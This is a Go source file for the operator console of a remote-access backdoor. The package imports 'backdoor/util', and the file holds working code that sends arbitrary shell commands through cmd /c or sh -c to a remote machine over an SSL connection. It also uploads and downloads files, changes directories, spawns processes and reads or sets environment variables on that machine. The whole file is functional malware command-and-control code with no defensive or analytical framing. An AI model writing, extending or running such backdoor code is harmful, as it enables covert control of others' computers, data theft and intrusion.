package main

import (
	"backdoor/util"
	"bufio"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
)

type CmdServer struct {
	conn     *util.SSLConn
	msgchan  *util.MsgChan
	exitUI   atomic.Bool
	fileName string
	fileData []byte
}

func NewCmdServer(conn *util.SSLConn) *CmdServer {
	pnew := new(CmdServer)
	pnew.conn = conn
	pnew.msgchan = util.NewMsgChan()
	go pnew.loopProc()
	return pnew
}

func (server *CmdServer) ProcUI(iswin bool, scanner *bufio.Scanner) {
	for {
		if iswin {
			util.SendCmdMsg(server.conn, util.CMD_SET_SHELL, []byte("cmd /c"))
		} else {
			util.SendCmdMsg(server.conn, util.CMD_SET_SHELL, []byte("sh -c"))
		}
		if !scanner.Scan() {
			break
		}
		if server.exitUI.Load() {
			break
		}
		cmdstr := strings.TrimSpace(scanner.Text())
		if len(cmdstr) == 0 {
			continue
		}
		if cmdstr == "help" {
			fmt.Println(`
upload file            --upload local file to remote working directory
download file          --download remote file to local working directory
cd path                --change remote working directory
createprocess cmd arg  --start goroutine to exec command, no response
setcmdshell cmd /c     --set remote shell
getenv                 --get remote all env var
setenv key=value       --set remote env var
exit                   --exit current session`)
			continue
		}
		if cmdstr == "exit" {
			break
		}
		if strings.HasPrefix(cmdstr, "upload ") {
			fileAddr := strings.TrimSpace(cmdstr[strings.Index(cmdstr, " "):])
			uploadFile(fileAddr, server.conn)
		} else if strings.HasPrefix(cmdstr, "download ") {
			fileAddr := strings.TrimSpace(cmdstr[strings.Index(cmdstr, " "):])
			util.SendCmdMsg(server.conn, util.CMD_DOWNLOAD_REQ, []byte(fileAddr))
		} else if strings.HasPrefix(cmdstr, "cd ") {
			cddir := strings.TrimSpace(cmdstr[strings.Index(cmdstr, " "):])
			util.SendCmdMsg(server.conn, util.CMD_CD, []byte(cddir))
		} else if strings.HasPrefix(cmdstr, "createprocess ") {
			args := strings.TrimSpace(cmdstr[strings.Index(cmdstr, " "):])
			util.SendCmdMsg(server.conn, util.CMD_NEWPROCESS_EXEC, []byte(args))
		} else if strings.HasPrefix(cmdstr, "setcmdshell ") {
			args := strings.TrimSpace(cmdstr[strings.Index(cmdstr, " "):])
			util.SendCmdMsg(server.conn, util.CMD_SET_SHELL, []byte(args))
		} else if cmdstr == "getenv" {
			util.SendCmdMsg(server.conn, util.CMD_GET_ENV, nil)
		} else if strings.HasPrefix(cmdstr, "setenv ") {
			args := strings.TrimSpace(cmdstr[strings.Index(cmdstr, " "):])
			util.SendCmdMsg(server.conn, util.CMD_SET_ENV, []byte(args))
		} else {
			util.SendCmdMsg(server.conn, util.CMD_EXEC, []byte(cmdstr))
		}
	}
}

func (server *CmdServer) OnMsg(msg []byte) {
	server.msgchan.In(msg)
}

func (server *CmdServer) loopProc() {
	for {
		msg, ok := server.msgchan.Out()
		if !ok {
			break
		}
		cmd := msg[0]
		msg = msg[1:]
		switch cmd {
		case util.CMD_FILE_BEG:
			server.procFileBeg(msg)
		case util.CMD_FILE_DATA:
			server.procFileData(msg)
		case util.CMD_FILE_END:
			server.procFileEnd(msg)
		case util.CMD_PRINT:
			fmt.Println(string(msg))
		}
	}
	server.exitUI.Store(true)
}

func (server *CmdServer) procFileBeg(msg []byte) {
	server.fileName = strings.TrimSpace(string(msg))
}

func (server *CmdServer) procFileData(msg []byte) {
	if len(server.fileName) == 0 {
		return
	}
	server.fileData = append(server.fileData, msg...)
}

func (server *CmdServer) procFileEnd(msg []byte) {
	if len(server.fileName) == 0 {
		return
	}
	err := util.TryStoreFileForMulti(server.fileName, server.fileData)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Printf("%s download success\n", server.fileName)
	server.fileName = ""
	server.fileData = nil
}

func (server *CmdServer) OnClose() {
	server.msgchan.Close()
}

func uploadFile(fileAddr string, conn *util.SSLConn) {
	contents, err := os.ReadFile(fileAddr)
	if err != nil {
		fmt.Println(err)
		return
	}
	if len(contents) == 0 {
		return
	}
	util.SendCmdMsg(conn, util.CMD_FILE_BEG, []byte(filepath.Base(fileAddr)))
	for beg := 0; beg < len(contents); {
		end := beg + 2048
		if end > len(contents) {
			end = len(contents)
		}
		util.SendCmdMsg(conn, util.CMD_FILE_DATA, contents[beg:end])
		beg = end
	}
	util.SendCmdMsg(conn, util.CMD_FILE_END, nil)
}
